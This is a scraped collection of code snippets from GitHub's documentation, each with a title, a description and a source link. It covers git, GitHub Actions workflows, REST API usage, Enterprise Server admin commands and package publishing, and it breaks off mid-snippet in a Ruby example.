https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nrm -rf node_modules\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Testing SSH Connection after Agent Forwarding Setup - Shell\nDESCRIPTION: This command verifies that agent forwarding is working correctly by attempting an SSH connection to GitHub (or GitHub Enterprise Server if `ghes` versioning is active) after setting up agent forwarding. A \"Permission denied (publickey)\" error indicates that agent forwarding is not properly configured or that the SSH agent is not providing the correct key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ echo \"$SSH_AUTH_SOCK\"\n# Print out the SSH_AUTH_SOCK variable\n> [No output]\n$ ssh -T git@{% ifversion ghes %}hostname{% else %}github.com{% endif %}\n# Try to SSH to github\n> Permission denied (publickey).\n```\n\n----------------------------------------\n\nTITLE: Encrypting a secret using C#\nDESCRIPTION: This snippet demonstrates how to encrypt a secret using C# and the Sodium.Core package. It converts the secret value to a byte array and the public key from Base64 to a byte array. It then uses `Sodium.SealedPublicKeyBox.Create` to encrypt the secret with the public key, and outputs the base64 encoded ciphertext. Requires the `Sodium.Core` package.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/encrypting-secrets-for-the-rest-api.md#_snippet_2\n\nLANGUAGE: C#\nCODE:\n```\nvar secretValue = System.Text.Encoding.UTF8.GetBytes(\"YOUR_SECRET\");\nvar publicKey = Convert.FromBase64String(\"YOUR_BASE64_KEY\");\n\nvar sealedPublicKeyBox = Sodium.SealedPublicKeyBox.Create(secretValue, publicKey);\n\nConsole.WriteLine(Convert.ToBase64String(sealedPublicKeyBox));\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Key for Nagios Authentication\nDESCRIPTION: This snippet shows how to generate an SSH key pair without a passphrase for Nagios to authenticate with the GitHub Enterprise Server cluster.  It's crucial to limit the key's authorization to a single read-only command for security reasons.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnagiosuser@nagios:~$ ssh-keygen -t ed25519\n> Generating public/private ed25519 key pair.\n> Enter file in which to save the key (/home/nagiosuser/.ssh/id_ed25519):\n> Enter passphrase (empty for no passphrase): LEAVE BLANK BY PRESSING ENTER\n> Enter same passphrase again: PRESS ENTER AGAIN\n> Your identification has been saved in /home/nagiosuser/.ssh/id_ed25519.\n> Your public key has been saved in /home/nagiosuser/.ssh/id_ed25519.pub.\n```\n\n----------------------------------------\n\nTITLE: Fixing Invalid Input Type in Body Block of YAML\nDESCRIPTION: This snippet explains how to fix the 'Body[i]: `x` is not a valid input type' error. One of the body blocks contains a type value that is not one of the permitted types.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: x\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n\n```\n\n----------------------------------------\n\nTITLE: Verifying DNS Configuration using dig command - Shell\nDESCRIPTION: This code snippet shows how to use the `dig` command to check if the TXT record needed for domain verification is accessible directly from your domain's main name servers. Replace `TXT-RECORD-NAME` with the actual name of the TXT record created.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/verifying-or-approving-a-domain-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndig TXT-RECORD-NAME +nostats +nocomments +nocmd TXT\n```\n\n----------------------------------------\n\nTITLE: Setting an error message in PowerShell\nDESCRIPTION: This snippet shows how to set an error message using the `error` workflow command in PowerShell, with file, line, column, and title parameters included.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_12\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: CodeQL Init with Autobuild Step (YAML)\nDESCRIPTION: This example illustrates using the `autobuild` action as a separate step in a CodeQL workflow.  The `Initialize CodeQL` step initializes the CodeQL environment, and the subsequent `Autobuild` step attempts to automatically build the project.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n    # Initializes the CodeQL tools for scanning.\n    - name: Initialize CodeQL\n      uses: {% data reusables.actions.action-codeql-action-init %}\n      with:\n        languages: {% raw %}${{ matrix.language }}{% endraw %}\n\n    - name: Autobuild\n      uses: {% data reusables.actions.action-codeql-action-autobuild %}\n```\n\n----------------------------------------\n\nTITLE: Authenticating with a {% data variables.product.prodname_github_app %} in JavaScript\nDESCRIPTION: This snippet demonstrates how to authenticate with the {% data variables.product.company_short %} REST API using a {% data variables.product.prodname_github_app %} with Octokit.js. It initializes an `App` instance with the `appId`, `privateKey`, and `installationId` parameters. Replace `APP_ID` with your app's ID, `PRIVATE_KEY` with your app's private key, and `INSTALLATION_ID` with the ID of the installation of your app. {% ifversion ghes %}Replace `HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { App } from \"octokit\";\n\nconst app = new App({\n  appId: APP_ID,\n  privateKey: PRIVATE_KEY,{% ifversion ghes %}\n  Octokit: Octokit.defaults({\n    baseUrl: \"{% data variables.product.rest_url %}\",\n  }),{% endif %}\n});\n\nconst octokit = await app.getInstallationOctokit(INSTALLATION_ID);\n```\n\n----------------------------------------\n\nTITLE: Updating Pull Request Status (Ruby)\nDESCRIPTION: This code snippet shows how to update the status of a pull request on GitHub using the Octokit client. It retrieves the repository's full name and the pull request's head SHA, and then uses `create_status` to set the status to 'pending'. It also shows how to update the status to \"success\" after a simulated CI process.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/building-a-ci-server.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\ndef process_pull_request(pull_request)\n  puts \"Processing pull request...\"\n  @client.create_status(pull_request['base']['repo']['full_name'], pull_request['head']['sha'], 'pending')\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef process_pull_request(pull_request)\n  @client.create_status(pull_request['base']['repo']['full_name'], pull_request['head']['sha'], 'pending')\n  sleep 2 # do busy work...\n  @client.create_status(pull_request['base']['repo']['full_name'], pull_request['head']['sha'], 'success')\n  puts \"Pull request processed!\"\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub issue via REST API\nDESCRIPTION: This JSON payload is used to create a new issue in a specified GitHub repository using the REST API. The request requires a title and a body for the issue.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/about-the-rest-api/comparing-githubs-rest-api-and-graphql-api.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"title\": \"Bug with feature X\",\n  \"body\": \"If you do A, then B happens\"\n}\n```\n\n----------------------------------------\n\nTITLE: Resulting Matrix Job Contexts in YAML\nDESCRIPTION: This snippet shows the resulting contexts for the matrix defined with arrays of objects. It displays how the matrix variables are expanded into individual job configurations, including operating systems, Node.js versions, and environment variables. Each job has access to these matrix values through the `matrix` context.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/multi-dimension-matrix.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n- matrix.os: ubuntu-latest\n  matrix.node.version: 14\n- matrix.os: ubuntu-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider\n- matrix.os: macos-latest\n  matrix.node.version: 14\n- matrix.os: macos-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider\n```\n\n----------------------------------------\n\nTITLE: Setting GITHUB_TOKEN Permissions to Read-All in YAML\nDESCRIPTION: This YAML snippet demonstrates how to grant `read` access to all available permissions for the GITHUB_TOKEN.  This simplifies the configuration when read-only access is required across all resources.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/github-token-available-permissions.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\npermissions: read-all\n```\n\n----------------------------------------\n\nTITLE: Enabling web commit signing using ghe-config in bash\nDESCRIPTION: This command enables web commit signing by setting the `app.github.web-commit-signing-enabled` configuration option to `true` using the `ghe-config` utility. It requires access to the administrative shell of GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-web-commit-signing.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nghe-config app.github.web-commit-signing-enabled true\n```\n\n----------------------------------------\n\nTITLE: Verifying staged changes with git status\nDESCRIPTION: This snippet demonstrates how to use `git status` to check the changes that have been staged for commit. The output confirms that the file has been renamed from the old location to the new location. The snippet indicates that the changes are ready to be committed.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/moving-a-file-to-a-new-location.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git status\n> # On branch YOUR-BRANCH\n> # Changes to be committed:\n> #   (use \"git reset HEAD <file>...\" to unstage)\n> #\n> #    renamed:    /old-folder/image.png -> /new-folder/image.png\n# Displays the changes staged for commit\n```\n\n----------------------------------------\n\nTITLE: Setting up Kustomize\nDESCRIPTION: This command downloads and sets up Kustomize, a Kubernetes YAML customization tool. It downloads a specific version of Kustomize for Linux amd64 architecture and makes it executable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64\nchmod u+x ./kustomize\n```\n\n----------------------------------------\n\nTITLE: Defining arguments for a Docker container with `jobs.<job_id>.steps[*].with.args`\nDESCRIPTION: This YAML snippet showcases how to define arguments for a Docker container using the `jobs.<job_id>.steps[*].with.args` syntax.  It specifies the `entrypoint` and `args` for the `octo-org/action-name` action, which will be passed to the container's `ENTRYPOINT` when it starts. Spaces in arguments should be enclosed in double quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Explain why this job ran\n    uses: octo-org/action-name@main\n    with:\n      entrypoint: /bin/echo\n      args: The ${{ github.event_name }} event triggered this step.\n```\n\n----------------------------------------\n\nTITLE: Continuing a Git Rebase\nDESCRIPTION: This command continues the rebase process after resolving conflicts or making changes during an interactive rebase. It tells Git to proceed with the remaining steps in the rebase sequence.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/using-git-rebase-on-the-command-line.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit rebase --continue\n```\n\n----------------------------------------\n\nTITLE: Adding commit hashes to .git-blame-ignore-revs\nDESCRIPTION: This code snippet shows the recommended structure for the `.git-blame-ignore-revs` file. It contains commit hashes that should be excluded from the blame view, along with comments explaining the reason for exclusion.  This helps in cleaning up the blame history and focusing on relevant changes.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/viewing-and-understanding-files.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# .git-blame-ignore-revs\n# Removed semi-colons from the entire codebase\na8940f7fbddf7fad9d7d50014d4e8d46baf30592\n# Converted all JavaScript to TypeScript\n69d029cec8337c616552756310748c4a507bd75a\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Push to Specific Branches with File Path Filter (YAML)\nDESCRIPTION: This workflow configuration will trigger the workflow when a push event occurs on any branch that starts with `releases/` AND the push includes changes to a JavaScript file (`.js`).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_37\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\n----------------------------------------\n\nTITLE: Calculating Factorial with a Loop in Python\nDESCRIPTION: This snippet calculates the factorial of a number (initially set to 6) using a for loop. It initializes the factorial to 1 and then iterates from 1 to the number, multiplying the factorial by each number in the range. Finally, it prints the result.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n# Initialize the factorial result to 1\nfactorial = 1\n\n# Initialize the input number to 6\nnumber = 6\n\n# Loop from 1 to number (inclusive) and multiply factorial by each number\nfor i in range(1, number + 1):\n    factorial *= i\n\nprint(f\"The factorial of {number} is {factorial}\")\n```\n\n----------------------------------------\n\nTITLE: Tagging a Docker image (GHES)\nDESCRIPTION: This command tags a Docker image with a new name and version, preparing it for publishing to the GitHub Packages registry on a GitHub Enterprise Server (GHES) instance. It requires the IMAGE_ID, OWNER, REPOSITORY, IMAGE_NAME, VERSION and HOSTNAME to be specified. It includes variations for subdomain isolation enabled and disabled.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ndocker tag IMAGE_ID docker.HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\nLANGUAGE: Shell\nCODE:\n```\ndocker tag IMAGE_ID HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\n----------------------------------------\n\nTITLE: Git Push Example with SSL Error\nDESCRIPTION: This code snippet demonstrates a typical Git push command that results in an SSL certificate error. The error indicates a problem verifying the CA certificate, suggesting an outdated certificate authority.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-ssl-certificate-problem-verify-that-the-ca-cert-is-ok.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git push -u github.main\n> fatal: 'github.main' does not appear to be a git repository\n> fatal: The remote end hung up unexpectedly\n```\n\n----------------------------------------\n\nTITLE: Locating runner service file on macOS\nDESCRIPTION: This command displays the content of the _.service_ file in the runner directory. This file contains the path to the launchd service file used by the runner application on macOS. It's used to identify the exact service name, especially when the default naming convention is truncated.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n% cat ~/actions-runner/.service\n```\n\n----------------------------------------\n\nTITLE: Pushing Git LFS Objects to the New Remote\nDESCRIPTION: This snippet pushes all LFS objects to the new remote (`NEW-REMOTE`) using `git lfs push`. This uploads the large files managed by LFS to the new server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-repositories-in-your-enterprise/configuring-git-large-file-storage-for-your-enterprise.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ git lfs push NEW-REMOTE --all\n> Scanning for all objects ever referenced...\n> ✔ 16 objects found\n> Pushing objects...\n> Git LFS: (16 of 16 files) 48.00 MB / 48.85 MB, 879.10 KB skipped\n```\n\n----------------------------------------\n\nTITLE: Verify GitHub Enterprise Version\nDESCRIPTION: This snippet verifies the GitHub Enterprise version after an upgrade. It uses the `ghe-version` command to display the currently installed version. This command is available on GitHub Enterprise Server instances.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/replica-verify.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-version\n```\n\n----------------------------------------\n\nTITLE: Querying Hardware Information with SNMP v2c\nDESCRIPTION: This command queries hardware-level information using SNMP v2c.  It utilizes `snmpwalk` to retrieve available MIBs from the GitHub Enterprise instance. Requires the community string and hostname (IP or domain) as parameters. The output is a list of available MIBs.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/monitoring-using-snmp.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ snmpwalk -v 2c -c COMMUNITY-STRING -O e HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Storing Client ID and Secret (Text)\nDESCRIPTION: This shows the format for storing the GitHub App's client ID and client secret in a `.env` file.  `YOUR_CLIENT_ID` and `YOUR_CLIENT_SECRET` should be replaced with the actual values. The `.env` file should not be committed to the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nCLIENT_ID=\"YOUR_CLIENT_ID\"\nCLIENT_SECRET=\"YOUR_CLIENT_SECRET\"\n```\n\n----------------------------------------\n\nTITLE: JavaScript API Usage with Octokit\nDESCRIPTION: This JavaScript script uses the Octokit library to make a request to the GitHub REST API. It retrieves issues from a specified repository and prints the titles and author IDs of those issues. The script requires the `octokit` package and uses the `TOKEN` environment variable for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport { Octokit } from \"octokit\"\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: process.env.TOKEN\n});\n\ntry {\n  const result = await octokit.request(\"GET /repos/{owner}/{repo}/issues\", {\n      owner: \"{% ifversion ghes %}REPO-OWNER{% else %}octocat{% endif %}\",\n      repo: \"{% ifversion ghes %}REPO-NAME{% else %}Spoon-Knife{% endif %}\",\n    });\n\n  const titleAndAuthor = result.data.map(issue => {title: issue.title, authorID: issue.user.id})\n\n  console.log(titleAndAuthor)\n\n} catch (error) {\n  console.log(`Error! Status: ${error.status}. Message: ${error.response.data.message}`)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Standard Support Bundle (Shell)\nDESCRIPTION: Creates a standard support bundle tarball using `ghe-support-bundle`. The `-o` option redirects output to STDOUT, which is then saved to a file.  Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_90\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -o' > support-bundle.tgz\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_PROJECT_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_PROJECT_URL` to the GitHub Actions equivalent `${{ github.server_url }}/${{ github.repository }}`. Creates the URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_63\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Switching to the Main Branch\nDESCRIPTION: This command switches the currently active branch in the local Git repository to the `main` branch. This ensures the local repository is synchronized with the remote's default branch before creating a new topic branch.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit checkout main\n```\n\n----------------------------------------\n\nTITLE: Suggest Git Blame for a Specific Line using GitHub Copilot\nDESCRIPTION: This command uses the GitHub Copilot CLI to suggest a `git` command that displays the blame information for a specific line in a file. It depends on the `gh` CLI and a functioning GitHub Copilot installation. It prompts the user to select \"git command\" and returns a suggested command.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh copilot suggest \"Show me the blame for line 1 of README.md\"\n```\n\n----------------------------------------\n\nTITLE: GitHub Copilot Usage Analytics Payload Example\nDESCRIPTION: This JSON payload shows the structure and example values of the data that GitHub Copilot sends to the analytics system, including platform, architecture, version, custom event details, and thread ID. This data helps improve the product and does not include data of specific individuals or specific queries.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-the-cli.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"platform\": \"darwin\",\n  \"architecture\": \"arm64\",\n  \"version\": \"0.3.0-beta\",\n  \"custom_event\": \"true\",\n  \"event_parent_command\": \"explain\",\n  \"event_name\": \"Explain\",\n  \"sha\": \"089a53215fc4383179869f7f6132ce9d6e58754a\",\n  \"thread_id\": \"e61d0d08-f6ba-465b-81cf-c30fd9127d70\"\n}\n```\n\n----------------------------------------\n\nTITLE: Unsetting actions-repos-sha1sum with ghe-config Shell\nDESCRIPTION: This code snippet unsets the `app.actions.actions-repos-sha1sum` configuration setting using the `ghe-config` command. This ensures that the bundled actions pre-installed on the new instance are up-to-date after restoring the backup. It is executed via the command line in the shell environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/backing-up-and-restoring-github-enterprise-server-with-github-actions-enabled.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config --unset 'app.actions.actions-repos-sha1sum'\n```\n\n----------------------------------------\n\nTITLE: Generate Metadata Archive - REST API\nDESCRIPTION: This snippet demonstrates how to generate a metadata archive using the GitHub REST API. A POST request is made to the `/orgs/ORGANIZATION/migrations` endpoint with the repository name in the body, excluding Git data but including releases. The request requires authentication via a Bearer token and specifies the content type as JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"repositories\": [\"repository_to_migrate\"],\n  \"exclude_git_data\": true,\n  \"exclude_releases\": false,\n  \"exclude_owner_projects\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Renaming a Remote Repository in Git\nDESCRIPTION: This snippet shows how to rename a remote repository using the `git remote rename` command. The `git remote -v` command is used before and after to display existing remotes and verify the change. It includes renaming the remote from 'origin' to 'destination'.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# View existing remotes\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n\n$ git remote rename origin destination\n# Change remote name from 'origin' to 'destination'\n\n$ git remote -v\n# Verify remote's new name\n> destination  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> destination  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Generate Git Source Archive - REST API\nDESCRIPTION: This snippet demonstrates how to generate a Git source archive using the GitHub REST API.  A POST request is made to the `/orgs/ORGANIZATION/migrations` endpoint with the repository name in the body, excluding metadata.  The request requires authentication via a Bearer token and specifies the content type as JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_2\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST /api/v3/orgs/acme-corp/migrations HTTP/1.1\nAccept: application/vnd.github+json\nAuthorization: Bearer <TOKEN>\nContent-Type: application/json\nHost: github.acmecorp.net\n\n{\n  \"repositories\": [\"repository_to_migrate\"],\n  \"exclude_metadata\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Example Sentiment Analysis of Feedback Issues\nDESCRIPTION: This text represents an example response from Copilot Chat after analyzing feedback issues. It lists issues, their URLs, number of reactions, and sentiment. This helps prioritize issues based on community engagement and overall sentiment.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/functionality-analysis-and-feature-suggestions/analyzing-and-incorporating-user-feedback.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n1. [Feedback] CLI error messages are difficult to understand\n  * Issue URL: #321\n  * Reactions: 543\n  * Sentiment: Negative\n\n1. [Feedback] Add API to enable third party integration\n  * Issue URL: #210\n  * Reactions: 482\n  * Sentiment: Positive\n\n1. [Feedback] Shortcut for --with-token CLI option\n  * Issue URL: #426\n  * Reactions: 187\n  * Sentiment: Neutral to slightly positive\n```\n\n----------------------------------------\n\nTITLE: Conditional GHES Content Rendering\nDESCRIPTION: This code snippet demonstrates conditional rendering of content based on the `ghes` version. If the version is `ghes`, the content related to JIT provisioning and manual user suspension is displayed. It leverages the Liquid templating engine.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/saml/saml-ghes-account-revocation.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes %}\n\nWith JIT provisioning, if you remove a user from your IdP, you must also manually suspend the user's account on {% data variables.location.product_location %}. Otherwise, the account's owner can continue to authenticate using access tokens or SSH keys. For more information, see [AUTOTITLE](/admin/user-management/managing-users-in-your-enterprise/suspending-and-unsuspending-users).\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Error Message: Name Character Limit - Bash\nDESCRIPTION: This bash snippet shows an error message indicating that the installation name exceeds the character limit of 45, likely within the `gha-runner-scale-set/templates/autoscalingrunnerset.yaml` template.  This error suggests the installation name needs to be shortened.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:5:5): Name must have up to 45 characters\n```\n\n----------------------------------------\n\nTITLE: Setting up Replication\nDESCRIPTION: This command initiates the replication setup process by connecting the replica appliance to the primary appliance. `PRIMARY_IP` should be replaced with the actual IP address of the primary appliance. This is a crucial step in configuring the high availability setup.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-setup PRIMARY_IP\n```\n\n----------------------------------------\n\nTITLE: Markdown Further Reading Section Format\nDESCRIPTION: This snippet illustrates the recommended format for a 'Further reading' section in a Markdown document. It uses an unordered list to provide links to additional articles and external resources that are relevant to the topic. The example shows how to format internal and external links, including specifying the source for external links.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/contents-of-a-github-docs-article.md#_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n## Further reading\n- [Article title](article-URL)\n- [External resource title](external-resource-URL) in External Resource Name\n```\n\n----------------------------------------\n\nTITLE: Build and Publish PowerShell Module\nDESCRIPTION: This PowerShell script snippet builds a PowerShell module, assuming a `build.ps1` script exists, and then publishes the module to the PowerShell Gallery using the `Publish-Module` cmdlet. It uses an API key passed in as an environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_7\n\nLANGUAGE: PowerShell\nCODE:\n```\n./build.ps1 -Path /tmp/samplemodule\nPublish-Module -Path /tmp/samplemodule -NuGetApiKey $env:NUGET_KEY -Verbose\n```\n\n----------------------------------------\n\nTITLE: Publishing a package with Maven\nDESCRIPTION: This shell command publishes a package to GitHub Packages using the Maven deploy plugin. It requires the `settings.xml` and `pom.xml` files to be configured correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nmvn deploy\n```\n\n----------------------------------------\n\nTITLE: Pulling Docker Images for Dependabot\nDESCRIPTION: This code snippet demonstrates how to pull specific Docker images required for Dependabot to function, specifically the `dependabot-update-job-proxy`, `dependabot-updater-github-actions`, and `dependabot-updater-npm` images. It uses the `docker pull` command to retrieve the images from the GitHub Container Registry (ghcr.io).  The `VERSION` and `SHA` placeholders need to be replaced with the actual version and SHA values found in the `containers.json` file for the specific GitHub Enterprise Server release. This is necessary when the Dependabot runner has limited or no internet access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-supply-chain-security-for-your-enterprise/configuring-dependabot-to-work-with-limited-internet-access.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndocker pull ghcr.io/github/dependabot-update-job-proxy/dependabot-update-job-proxy:VERSION@SHA\ndocker pull ghcr.io/dependabot/dependabot-updater-github-actions:VERSION@SHA\ndocker pull ghcr.io/dependabot/dependabot-updater-npm:VERSION@SHA\n```\n\n----------------------------------------\n\nTITLE: Handling Check Run Requested Action (Ruby)\nDESCRIPTION: This helper method handles the `requested_action` event for check runs. If the requested action is 'fix_rubocop_notices', it clones the repository, configures Git user settings, automatically corrects RuboCop style errors, commits the changes, and pushes them to the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_50\n\nLANGUAGE: Ruby\nCODE:\n```\n    # 